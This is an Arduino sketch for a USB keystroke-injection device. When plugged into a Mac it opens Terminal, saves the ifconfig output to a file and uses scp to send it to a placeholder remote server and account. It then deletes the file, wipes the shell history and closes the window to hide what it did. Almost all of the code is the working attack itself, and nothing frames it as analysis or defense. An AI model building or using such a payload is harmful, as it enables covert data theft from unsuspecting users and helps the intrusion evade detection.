#include <Keyboard.h>

//Sends ifconfig to a server

void setup() {
  Serial.begin(9600);
  
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW) {
    Serial.print("aborting\n");
    abort();
  }

  Keyboard.begin();
  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);
  
  Keyboard.print("terminal");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  
  delay(750);

  Keyboard.print("ifconfig > ifconfig_rip.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("scp -r ~/ifconfig_rip.txt [USER]@[IP HERE]:~/[PATH]");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("[PASSWORD HERE]");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(5000);

  Keyboard.print("rm ifconfig_rip.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("history -c");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("clear");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();
  
  Keyboard.end();
}

void loop() {
}
